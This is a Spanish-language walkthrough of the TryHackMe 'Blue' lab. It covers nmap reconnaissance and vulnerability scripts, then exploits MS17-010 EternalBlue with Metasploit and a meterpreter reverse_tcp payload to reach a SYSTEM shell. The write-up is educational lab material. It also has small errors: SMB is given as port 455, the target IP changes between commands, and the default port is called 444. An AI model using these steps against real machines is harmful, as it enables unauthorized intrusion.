---
title : Máquina|Blue
published : True
---

* <p>Nombre : Blue</p>
* <p>Url : <a href="https://tryhackme.com/room/blue">Blue</a></p>
>

<h2><font color="white"><center># blue</center></font></h2>
* <p>Empezaremos con el reconocimiento de la maquina</p>
> ping -c 1 10.10.157.254
>
<img src="/imgs/blue/blue0.jpg"/>
* <p>Vemos que en la imagen el ttl es de 127 lo que indica que es una maquina windows, ahora vemos que puertos están abiertos.</p>
> nmap --min-rate 5000 -Pn -sS --open 10.10.157.254 -o allports
>
<img src="/imgs/blue/blue1.jpg"/>
* <p>tiene el puerto smb abierto <font color="gold">455</font> veremos si tiene vulnerabilidades, con nmap.</p>
> nmap --script smb-vuln* 10.10.127.254
>
<img src="/imgs/blue/blue2.jpg"/>
* <p>Al paracer es vulnerable a <font color="yellow">( ms17-010 EternalBlue )</font>, ahora explotemos con <font color="gold">msfconsole</font>, usamos el exploit EternalBlue </p>
> use exploit/windows/smb/ms17_010_eternalblue
>
<img src="/imgs/blue/blue3.jpg"/>
* <p>Ahora indicamos el payload que queremos ejecutar una vez ganado acceso a la maquina.</p>
> set payload windows/meterpreter/reverse_tcp
>
<img src="/imgs/blue/blue4.jpg"/>
* <p>Indicamos la ip de la maquina victima con <font color="gold">set rhosts</font>.</p>
>
<img src="/imgs/blue/blue5.jpg"/>
* <p>Ahora indicamos nuestra ip tun0 de nuestra vpn de tryHackMe.</p>
>
<img src="/imgs/blue/blue6.jpg"/>
* <p>Seguidamente cambiamos el puerto 444 que viene por defecto para el payload, en caso de que haya un firewall indicado para cerrar conecciones
por el puerto 444.</p>
>
<img src="/imgs/blue/blue7.jpg"/>
* <p>Seguidamente ejecutamos <font color="red">exploit</font> para iniciar el ataque.</p>
>
<img src="/imgs/blue/blue8.jpg"/>
* <p>Y listo si ejecutas el comando Shell, y pones whoami seras autority system.</p>
* <p>Ok maquina vulnerada</p>

